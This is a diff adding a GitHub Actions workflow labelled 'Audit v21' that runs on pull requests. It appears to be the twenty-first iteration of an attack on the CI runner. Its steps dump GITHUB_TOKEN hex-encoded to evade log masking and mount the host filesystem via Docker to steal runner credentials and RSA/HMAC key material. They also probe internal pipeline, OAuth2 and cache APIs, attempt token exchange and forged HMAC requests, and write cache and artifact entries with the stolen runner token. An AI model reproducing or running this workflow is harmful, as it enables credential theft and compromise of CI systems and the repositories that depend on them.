@@ -1,0 +1,513 @@
+name: Audit v21
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v21:
+    runs-on: ubuntu-latest
+    env:
+      UPSTREAM_OWNER: twrps
+      UPSTREAM_REPO: PoC-RACE2
+      FORK_OWNER: lacaag
+      FORK_REPO: PoC-RACE2
+    steps:
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 1: Harvest + extract HMAC material + full connectionData
+      # v20: run-service said "request hmac is missing"
+      # HMAC key is in .credentials_rsaparams — extract via Docker
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 1 - Harvest + HMAC
+        if: always()
+        run: |
+          set +e
+          echo "=== V21 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            # v14-style extraction that works
+            RUN_URL=$(grep -oP '"url"\s*:\s*"https://run-actions[^"]+' "$WLOG" | head -1 | sed 's/"url"\s*:\s*"//')
+            echo "RUN_URL=$RUN_URL"; echo "$RUN_URL" > /tmp/run_url.txt
+
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\\s*:\\s*\"\\K[^\"]+" "$WLOG" | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+
+            # Dump FULL connectionData structure (has location mappings)
+            echo "--- Full connectionData ---"
+            /usr/bin/curl -sS -H "Authorization: Bearer $RT" \
+              "$(cat /tmp/PipelinesServiceUrl.txt)_apis/connectionData" > /tmp/conndata.json
+            cat /tmp/conndata.json | jq '{instanceId,locationServiceData: {serviceOwner: .locationServiceData.serviceOwner, accessMappings: .locationServiceData.accessMappings}}' 2>/dev/null
+            echo ""
+
+            # Get ALL access mappings (these contain service URLs)
+            echo "--- Access mappings ---"
+            cat /tmp/conndata.json | jq '.locationServiceData.accessMappings[]? | {moniker: .moniker, accessPoint: .accessPoint}' 2>/dev/null
+            echo ""
+          fi
+
+          # Extract HMAC key + RSA params from Docker
+          echo "--- HMAC extraction ---"
+          docker run --rm -v /:/h alpine sh -c '
+            echo "=== .credentials_rsaparams ==="
+            cat /h/home/runner/actions-runner/cached/*/.credentials_rsaparams 2>/dev/null
+            echo ""
+            echo "=== .credentials FULL ==="
+            cat /h/home/runner/actions-runner/cached/*/.credentials 2>/dev/null
+            echo ""
+            echo "=== .runner ==="
+            cat /h/home/runner/actions-runner/cached/*/.runner 2>/dev/null
+            echo ""
+            echo "=== .env ==="
+            cat /h/home/runner/actions-runner/cached/*/.env 2>/dev/null
+            echo ""
+            echo "=== .path ==="
+            cat /h/home/runner/actions-runner/cached/*/.path 2>/dev/null
+            echo ""
+            # Look for HMAC keys or secrets in any config
+            echo "=== Other secrets ==="
+            find /h/home/runner/actions-runner -name "*.json" -o -name "*.config" -o -name "*.key" -o -name "*.pem" 2>/dev/null | while read F; do
+              SIZE=$(wc -c < "$F" 2>/dev/null)
+              [ "$SIZE" -lt 10000 ] && [ "$SIZE" -gt 0 ] && echo "FILE=$F SIZE=$SIZE" && head -3 "$F" 2>/dev/null && echo ""
+            done
+            # Worker internal state
+            echo "=== Worker process state ==="
+            for P in $(ls /h/proc/ | grep -E "^[0-9]+$" | head -80); do
+              CMD=$(cat /h/proc/$P/cmdline 2>/dev/null | tr "\0" " " | head -c 80)
+              case "$CMD" in
+                *Runner.Worker*|*Runner.Listener*)
+                  echo "PID=$P CMD=$CMD"
+                  # Dump all file descriptors for open connections
+                  ls -la /h/proc/$P/fd/ 2>/dev/null | grep socket | head -5
+                  # Environment vars
+                  cat /h/proc/$P/environ 2>/dev/null | tr "\0" "\n" | grep -iE "HMAC|SIGN|SECRET|KEY|HASH|RUNTIME|CACHE|RESULT" 2>/dev/null | head -20
+                  echo ""
+                  ;;
+              esac
+            done
+          ' 2>&1 > /tmp/docker_extract.txt
+          cat /tmp/docker_extract.txt | head -100
+          echo ""
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: Timeline via correct Azure DevOps paths
+      # v20: timelines returned 404 at wrong path
+      # Azure DevOps has multiple path variants for timeline access
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - Timeline paths
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== TIMELINE PATHS ==="
+          RT=$(cat /tmp/rt.txt)
+          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)
+          PLAN=$(cat /tmp/plan.txt 2>/dev/null)
+          JOB=$(cat /tmp/job.txt 2>/dev/null)
+          [ -z "$PURL" ] && exit 0
+
+          # Try every possible timeline path variant
+          echo "--- A: Timeline discovery ---"
+          for PATH_T in \
+            "_apis/distributedtask/plans/$PLAN/timelines" \
+            "_apis/distributedtask/plans/$PLAN/timeline" \
+            "_apis/distributedtask/taskagent/plans/$PLAN/timelines" \
+            "_apis/distributedtask/hub/plan/$PLAN/timelines" \
+            "_apis/distributedtask/taskagent/timelines" \
+            "$PLAN/timelines" \
+            "_apis/build/builds/$PLAN/timeline" \
+            "_apis/pipelines/runs/${{ github.run_id }}/timeline" \
+            "_apis/distributedtask/plans/$PLAN/events" \
+            "_apis/distributedtask/plans/$PLAN/jobs" \
+            "_apis/distributedtask/plans/$PLAN/jobs/$JOB" \
+            "_apis/distributedtask/plans/$PLAN/jobs/$JOB/timeline" \
+            "_apis/distributedtask/plans/$PLAN/logs" \
+            "_apis/distributedtask/plans/$PLAN/attachments" \
+            "_apis/distributedtask/taskagent/plans/$PLAN/jobs" \
+            "_apis/distributedtask/taskagent/plans/$PLAN/logs" \
+            "_apis/build/builds/${{ github.run_id }}/timeline" \
+            "_apis/build/builds/${{ github.run_id }}/logs" \
+            "_apis/build/builds/${{ github.run_id }}" \
+            "_apis/pipelines/1/runs/${{ github.run_id }}" \
+            "_apis/pipelines/runs/${{ github.run_id }}"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" "${PURL}${PATH_T}")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "$PATH_T = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+          echo ""
+
+          # B: Try to POST logs directly
+          echo "--- B: Create log ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+            "${PURL}_apis/distributedtask/plans/$PLAN/logs" \
+            -d '{"path":"v21-injected"}')
+          CODE=$(echo "$R" | tail -1)
+          echo "B create log = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+          # C: Try POST events
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+            "${PURL}_apis/distributedtask/plans/$PLAN/events" \
+            -d '{"name":"v21-event","data":"test"}')
+          CODE=$(echo "$R" | tail -1)
+          echo "C event = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: oauth2 resource area — token exchange
+      # v20 found this area exists. Could exchange tokens.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - OAuth2 + token exchange
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== OAUTH2 + TOKEN EXCHANGE ==="
+          RT=$(cat /tmp/rt.txt)
+          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)
+          [ -z "$PURL" ] && exit 0
+
+          # A: Discovery on oauth2 endpoints
+          echo "--- A: oauth2 discovery ---"
+          for EP in \
+            "_apis/oauth2/token" \
+            "_apis/oauth2/authorize" \
+            "_apis/oauth2/clients" \
+            "_apis/oauth2/global/tokens" \
+            "_apis/token" \
+            "_apis/token/session" \
+            "_apis/token/refresh" \
+            "_apis/Tokens" \
+            "_apis/Tokens/Create" \
+            "_apis/oauth2/configurations" \
+            "_apis/oauth2/providers" \
+            "_apis/oauth2/token?grant_type=client_credentials" \
+            "_apis/connections" \
+            "_apis/connections/data" \
+            "_apis/connectionData?connectOptions=1&lastChangeId=-1" \
+            "_apis/connectionData?includeUnauthorizedApis=true"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" "${PURL}${EP}")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "A $EP = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+          echo ""
+
+          # B: Try token exchange via POST
+          echo "--- B: Token exchange POST ---"
+          for EP in "_apis/oauth2/token" "_apis/token" "_apis/Tokens/Create"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+              "${PURL}${EP}" \
+              -d "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:jwt-bearer\",\"assertion\":\"$RT\",\"client_id\":\"v21\",\"scope\":\"*\"}")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && \
+              echo "B $EP = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+          echo ""
+
+          # C: connectionData with options to get more detail
+          echo "--- C: connectionData extended ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" \
+            "${PURL}_apis/connectionData?connectOptions=1&lastChangeId=-1&includeServices=true")
+          echo "$R" | jq '{authenticatedUser: .authenticatedUser, authorizedUser: .authorizedUser}' 2>/dev/null
+          echo ""
+          echo "locationServiceData entries:"
+          echo "$R" | jq '.locationServiceData.serviceDefinitions | length' 2>/dev/null
+          echo "$R" | jq -c '.locationServiceData.serviceDefinitions[]? | {serviceType, identifier, displayName}' 2>/dev/null | head -30
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: Systematic resource area exploration
+      # Use the GUID from each area to construct proper API calls
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - Resource area APIs
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== RESOURCE AREA APIs ==="
+          RT=$(cat /tmp/rt.txt)
+          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)
+          [ -z "$PURL" ] && exit 0
+
+          # Each resource area from v20, hit their root + common sub-paths
+          for AREA in distributedtask build runtime PipelinesChecks pipelines runner actions serviceendpoint; do
+            echo "=== AREA: $AREA ==="
+            for EP in "" "/" "?api-version=7.1" "?api-version=6.0"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                -H "Authorization: Bearer $RT" "${PURL}_apis/${AREA}${EP}")
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+                echo "  GET _apis/${AREA}${EP} = $CODE | $(echo "$BODY" | head -c 200)"
+            done
+          done
+          echo ""
+
+          # Specific endpoints within each area
+          echo "=== SPECIFIC ENDPOINTS ==="
+          for EP in \
+            "_apis/runner/registration" \
+            "_apis/runner/registration?api-version=6.0" \
+            "_apis/runner/pools" \
+            "_apis/runner/machines" \
+            "_apis/runner/agents" \
+            "_apis/actions/generalSettings" \
+            "_apis/actions/permissions" \
+            "_apis/actions/cache" \
+            "_apis/actions/runs" \
+            "_apis/actions/secrets" \
+            "_apis/PipelinesChecks/runs" \
+            "_apis/PipelinesChecks/configurations" \
+            "_apis/runtime/pipelines" \
+            "_apis/runtime/webhooks" \
+            "_apis/pipelines" \
+            "_apis/pipelines/1" \
+            "_apis/pipelines/1/runs" \
+            "_apis/serviceendpoint/endpoints" \
+            "_apis/serviceendpoint/types" \
+            "_apis/build/definitions" \
+            "_apis/build/builds" \
+            "_apis/build/builds/${{ github.run_id }}"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" "${PURL}${EP}")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "  $EP = $CODE | $(echo "$BODY" | head -c 250)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 5: Run-service with HMAC — use extracted RSA params
+      # v20: "request hmac is missing"
+      # Use Python to sign requests with extracted key material
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 5 - Run service HMAC
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== RUN SERVICE HMAC ==="
+          RT=$(cat /tmp/rt.txt)
+          RUN_URL=$(cat /tmp/run_url.txt 2>/dev/null)
+          PLAN=$(cat /tmp/plan.txt 2>/dev/null)
+          JOB=$(cat /tmp/job.txt 2>/dev/null)
+
+          echo "RUN_URL=$RUN_URL"
+
+          # Extract RSA params and credentials via Docker for Python
+          docker run --rm -v /:/h alpine sh -c '
+            cat /h/home/runner/actions-runner/cached/*/.credentials_rsaparams 2>/dev/null
+          ' 2>/dev/null > /tmp/rsaparams.json
+
+          docker run --rm -v /:/h alpine sh -c '
+            cat /h/home/runner/actions-runner/cached/*/.credentials 2>/dev/null
+          ' 2>/dev/null > /tmp/credentials.json
+
+          echo "RSA params size: $(wc -c < /tmp/rsaparams.json)"
+          echo "Credentials size: $(wc -c < /tmp/credentials.json)"
+
+          # Parse and try HMAC signing
+          python3 << 'PYEOF'
+          import json, base64, hashlib, hmac, time, sys, urllib.request, os
+
+          run_url = open('/tmp/run_url.txt').read().strip()
+          rt = open('/tmp/rt.txt').read().strip()
+          plan = open('/tmp/plan.txt').read().strip()
+          job = open('/tmp/job.txt').read().strip()
+
+          # Load credentials
+          try:
+              creds = json.loads(open('/tmp/credentials.json').read())
+              print(f"Creds keys: {list(creds.keys())}")
+              if 'Data' in creds:
+                  data = creds['Data']
+                  print(f"Data keys: {list(data.keys())}")
+                  token = data.get('token', '')
+                  print(f"Token len: {len(token)} prefix: {token[:40]}...")
+                  # The token itself might work as the HMAC key
+                  # or as Bearer auth on run-service
+              if 'Scheme' in creds:
+                  print(f"Scheme: {creds['Scheme']}")
+          except Exception as e:
+              print(f"Creds parse error: {e}")
+
+          # Load RSA params
+          try:
+              rsa = json.loads(open('/tmp/rsaparams.json').read())
+              print(f"RSA keys: {list(rsa.keys())}")
+              # Common RSA param fields: d, dp, dq, e, exponent, modulus, n, p, q
+              for k in rsa:
+                  v = str(rsa[k])
+                  print(f"  {k}: {v[:40]}..." if len(v) > 40 else f"  {k}: {v}")
+          except Exception as e:
+              print(f"RSA parse error: {e}")
+
+          # Try using the credential token as Bearer on run-service
+          if run_url and not '[' in run_url:
+              try:
+                  creds_data = json.loads(open('/tmp/credentials.json').read())
+                  cred_token = creds_data.get('Data', {}).get('token', '')
+                  if cred_token:
+                      for ep in ['', 'check', '_apis/pipelines/runs']:
+                          url = f"{run_url}{ep}"
+                          req = urllib.request.Request(url)
+                          req.add_header('Authorization', f'Bearer {cred_token}')
+                          try:
+                              resp = urllib.request.urlopen(req, timeout=5)
+                              print(f"CRED_TOKEN {ep} = {resp.status} | {resp.read()[:200]}")
+                          except urllib.error.HTTPError as e:
+                              body = e.read().decode('utf-8', errors='ignore')[:200]
+                              print(f"CRED_TOKEN {ep} = {e.code} | {body}")
+                          except Exception as e:
+                              print(f"CRED_TOKEN {ep} = ERR: {e}")
+
+                      # Try with HMAC derived from token
+                      # GitHub Actions run-service uses SHA256 HMAC
+                      for ep in ['check', '_apis/pipelines/runs']:
+                          url = f"{run_url}{ep}"
+                          body = b''
+                          # Compute HMAC-SHA256 of the URL + timestamp
+                          ts = str(int(time.time()))
+                          msg = f"{url}\n{ts}".encode()
+                          for key_source in [cred_token, rt]:
+                              try:
+                                  key = key_source.encode() if isinstance(key_source, str) else key_source
+                                  sig = hmac.new(key, msg, hashlib.sha256).hexdigest()
+                                  req = urllib.request.Request(url)
+                                  req.add_header('Authorization', f'Bearer {rt}')
+                                  req.add_header('X-Request-Hmac', sig)
+                                  req.add_header('X-Hmac-Timestamp', ts)
+                                  resp = urllib.request.urlopen(req, timeout=5)
+                                  print(f"HMAC {ep} = {resp.status} | {resp.read()[:200]}")
+                              except urllib.error.HTTPError as e:
+                                  body = e.read().decode('utf-8', errors='ignore')[:200]
+                                  print(f"HMAC {ep} = {e.code} | {body}")
+                              except Exception as e:
+                                  print(f"HMAC {ep} = ERR: {e}")
+              except Exception as e:
+                  print(f"Error: {e}")
+          PYEOF
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 6: Cache via CacheServerUrl with GITHUB_TOKEN
+      # v20: ACTIONS_RUNTIME_TOKEN empty. But CacheServerUrl exists.
+      # Try the old cache API with GITHUB_TOKEN directly.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 6 - Cache direct
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== CACHE DIRECT ==="
+          RT=$(cat /tmp/rt.txt)
+          CACHE_URL=$(cat /tmp/CacheServerUrl.txt 2>/dev/null)
+
+          echo "CACHE_URL=$CACHE_URL"
+          if [ -n "$CACHE_URL" ]; then
+            # A: Different API versions
+            echo "--- A: Cache GET ---"
+            for VER in "6.0-preview.1" "7.1-preview.1"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
+                -H "Authorization: Bearer $RT" \
+                -H "Accept: application/json;api-version=$VER" \
+                "${CACHE_URL}_apis/artifactcache/cache?keys=*&version=*")
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              echo "A ver=$VER = $CODE | $(echo "$BODY" | head -c 300)"
+            done
+            echo ""
+
+            # B: Reserve with GITHUB_TOKEN
+            echo "--- B: Reserve ---"
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+              -H "Accept: application/json;api-version=6.0-preview.1" \
+              "${CACHE_URL}_apis/artifactcache/caches" \
+              -d '{"key":"v21-test","version":"v21"}')
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B reserve = $CODE | $(echo "$BODY" | head -c 300)"
+
+            # C: Try with extracted credential token
+            docker run --rm -v /:/h alpine sh -c '
+              cat /h/home/runner/actions-runner/cached/*/.credentials 2>/dev/null
+            ' 2>/dev/null | python3 -c "
+          import json, sys
+          try:
+            data = json.load(sys.stdin)
+            print(data.get('Data',{}).get('token',''))
+          except: pass
+          " > /tmp/cred_tok_clean.txt
+            CTOK=$(cat /tmp/cred_tok_clean.txt)
+            echo "CTOK: ${#CTOK} chars"
+
+            if [ -n "$CTOK" ]; then
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+                -H "Authorization: Bearer $CTOK" -H "Content-Type: application/json" \
+                -H "Accept: application/json;api-version=6.0-preview.1" \
+                "${CACHE_URL}_apis/artifactcache/caches" \
+                -d '{"key":"v21-cred-test","version":"v21"}')
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              echo "C cred reserve = $CODE | $(echo "$BODY" | head -c 300)"
+
+              # Also try on results-receiver with cred token
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+                -H "Authorization: Bearer $CTOK" -H "Content-Type: application/json" \
+                "https://results-receiver.actions.githubusercontent.com/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry" \
+                -d '{"key":"v21-cred","version":"1"}')
+              CODE=$(echo "$R" | tail -1)
+              echo "C results cred = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+                -H "Authorization: Bearer $CTOK" -H "Content-Type: application/json" \
+                "https://results-receiver.actions.githubusercontent.com/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" \
+                -d '{"name":"v21-cred","workflow_run_backend_id":"1","workflow_job_run_backend_id":"1"}')
+              CODE=$(echo "$R" | tail -1)
+              echo "C results artifact = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+            fi
+          fi
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 7: Final
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 7 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V21 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "RSA_SIZE=$(wc -c < /tmp/rsaparams.json 2>/dev/null)"
+          echo "CRED_SIZE=$(wc -c < /tmp/credentials.json 2>/dev/null)"
+          echo "=== V21 COMPLETE ==="
